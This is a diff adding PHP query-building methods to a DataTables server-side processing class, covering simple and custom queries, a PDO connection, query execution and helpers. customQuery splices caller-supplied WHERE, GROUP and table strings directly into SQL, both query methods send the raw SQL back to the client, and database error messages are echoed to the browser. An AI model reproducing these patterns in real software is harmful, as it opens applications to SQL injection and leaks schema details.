+	static function simple ( $request, $sql_details, $table, $primaryKey, $columns )
+	{
+		$bindings = array();
+		$db = SSP::sql_connect( $sql_details );
+
+		// Build the SQL query string from the request
+		$limit = SSP::limit( $request, $columns );
+		$order = SSP::order( $request, $columns );
+		$where = SSP::filter( $request, $columns, $bindings );
+
+		// Main query to actually get the data
+                $sql_string = "SELECT SQL_CALC_FOUND_ROWS ".implode(", ", SSP::pluck($columns, 'db', false))."
+			 FROM `$table`
+			 $where
+			 $order
+			 $limit";
+//                echo $sql_string;
+		$data = SSP::sql_exec( $db, $bindings, $sql_string
+			
+		);
+
+		// Data set length after filtering
+		$resFilterLength = SSP::sql_exec( $db,
+			"SELECT FOUND_ROWS()"
+		);
+		$recordsFiltered = $resFilterLength[0][0];
+
+		// Total data set length
+		$resTotalLength = SSP::sql_exec( $db,
+			"SELECT COUNT(`{$primaryKey}`)
+			 FROM   `$table`"
+		);
+		$recordsTotal = $resTotalLength[0][0];
+
+
+		/*
+		 * Output
+		 */
+		return array(
+			"draw"            => intval( $request['draw'] ),
+			"recordsTotal"    => intval( $recordsTotal ),
+			"recordsFiltered" => intval( $recordsFiltered ),
+			"data"            => SSP::data_output( $columns, $data ),
+                        "sql"             => $sql_string
+		);
+	}
+        
+        
+        static function customQuery ( $request, $sql_details, $table, $primaryKey, $columns, $addwhere, $group="",$counttable='',$countwhere='' )
+	{
+		$bindings = array();
+		$db = SSP::sql_connect( $sql_details );
+//                var_dump($request);
+		// Build the SQL query string from the request
+		$limit = SSP::limit( $request, $columns );
+		$order = SSP::order( $request, $columns );
+		$where = SSP::filter( $request, $columns, $bindings );
+                $where = ($where=="")?(($addwhere=="")?"":"WHERE ".$addwhere):$where.(($addwhere=="")?"":" AND ".$addwhere);
+                
+                //$where=($where=="")?"WHERE ".$addwhere:$where." ".$addwhere;
+
+		// Main query to actually get the data
+                $sql_string = "SELECT SQL_CALC_FOUND_ROWS ".implode(", ", SSP::pluck($columns, 'db', false))."
+			FROM $table
+                        $where
+                        $group
+                        $order
+			$limit";
+//                echo $sql_string;
+		$data = SSP::sql_exec( $db, $bindings, $sql_string
+			
+		);
+
+		// Data set length after filtering
+		$resFilterLength = SSP::sql_exec( $db,
+			"SELECT FOUND_ROWS()"
+		);
+		$recordsFiltered = $resFilterLength[0][0];
+
+		// Total data set length
+                $countwhere=($countwhere=="")?"":"WHERE ".$countwhere;
+		$resTotalLength = SSP::sql_exec( $db,
+			"SELECT COUNT($primaryKey)
+			 FROM   $counttable 
+                         $countwhere"
+		);
+		$recordsTotal = $resTotalLength[0][0];
+
+
+		/*
+		 * Output
+		 */
+		return array(
+			"draw"            => intval( $request['draw'] ),
+			"recordsTotal"    => intval( $recordsTotal ),
+			"recordsFiltered" => intval( $recordsFiltered ),
+			"data"            => SSP::data_output( $columns, $data ),
+                        "sql"             => $sql_string
+		);
+	}
+
+
+	/**
+	 * Connect to the database
+	 *
+	 * @param  array $sql_details SQL server connection details array, with the
+	 *   properties:
+	 *     * host - host name
+	 *     * db   - database name
+	 *     * user - user name
+	 *     * pass - user password
+	 * @return resource Database connection handle
+	 */
+	static function sql_connect ( $sql_details )
+	{
+		try {
+			$db = @new PDO(
+				"mysql:host={$sql_details['host']};dbname={$sql_details['db']}",
+				$sql_details['user'],
+				$sql_details['pass'],
+				array( PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION )
+			);
+		}
+		catch (PDOException $e) {
+			SSP::fatal(
+				"An error occurred while connecting to the database. ".
+				"The error reported by the server was: ".$e->getMessage()
+			);
+		}
+
+		return $db;
+	}
+
+
+	/**
+	 * Execute an SQL query on the database
+	 *
+	 * @param  resource $db  Database handler
+	 * @param  array    $bindings Array of PDO binding values from bind() to be
+	 *   used for safely escaping strings. Note that this can be given as the
+	 *   SQL query string if no bindings are required.
+	 * @param  string   $sql SQL query to execute.
+	 * @return array         Result from the query (all rows)
+	 */
+	static function sql_exec ( $db, $bindings, $sql=null )
+	{
+		// Argument shifting
+		if ( $sql === null ) {
+			$sql = $bindings;
+		}
+
+		$stmt = $db->prepare( $sql );
+		//echo $sql;
+
+		// Bind parameters
+		if ( is_array( $bindings ) ) {
+			for ( $i=0, $ien=count($bindings) ; $i<$ien ; $i++ ) {
+				$binding = $bindings[$i];
+				$stmt->bindValue( $binding['key'], $binding['val'], $binding['type'] );
+			}
+		}
+
+		// Execute
+		try {
+			$stmt->execute();
+		}
+		catch (PDOException $e) {
+			SSP::fatal( "An SQL error occurred: ".$e->getMessage() );
+		}
+
+		// Return all
+		return $stmt->fetchAll();
+	}
+
+
+	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+	 * Internal methods
+	 */
+
+	/**
+	 * Throw a fatal error.
+	 *
+	 * This writes out an error message in a JSON string which DataTables will
+	 * see and show to the user in the browser.
+	 *
+	 * @param  string $msg Message to send to the client
+	 */
+	static function fatal ( $msg )
+	{
+		echo json_encode( array( 
+			"error" => $msg
+		) );
+
+		exit(0);
+	}
+
+	/**
+	 * Create a PDO binding key which can be used for escaping variables safely
+	 * when executing a query with sql_exec()
+	 *
+	 * @param  array &$a    Array of bindings
+	 * @param  *      $val  Value to bind
+	 * @param  int    $type PDO field type
+	 * @return string       Bound key to be used in the SQL where this parameter
+	 *   would be used.
+	 */
+	static function bind ( &$a, $val, $type )
+	{
+		$key = ':binding_'.count( $a );
+
+		$a[] = array(
+			'key' => $key,
+			'val' => $val,
+			'type' => $type
+		);
+
+		return $key;
+	}
+
+
+	/**
+	 * Pull a particular property from each assoc. array in a numeric array, 
+	 * returning and array of the property values from each item.
+	 *
+	 *  @param  array  $a    Array to get data from
+	 *  @param  string $prop Property to read
+	 *  @return array        Array of property values
+	 */
+	static function pluck ( $a, $prop, $plain=true )
+	{
+		$out = array();
+
+		for ( $i=0, $len=count($a) ; $i<$len ; $i++ ) {
+                    // Is there a alias?
+                    if ( isset( $a[$i]['db'] ) ) {
+                        if ( isset( $a[$i]['alias'] ) ) {
+                                //$row[ $column['dt'] ] = $column['formatter']( $data[$i][ $column['db'] ], $data[$i] );
+                            if($plain)
+                            {
+                                $out[] = $a[$i]['alias'];
+                            }
+                            else
+                            {
+                                $out[] = $a[$i][$prop]." AS ".$a[$i]['alias'];
+                            }
+                        }
+                        else {
+                                //$row[ $column['dt'] ] = $data[$i][ $columns[$j]['db'] ];
+                            $out[] = $a[$i][$prop];
+                        }
+                    }
+			
+		}
+
+		return $out;
+	}
+}
+
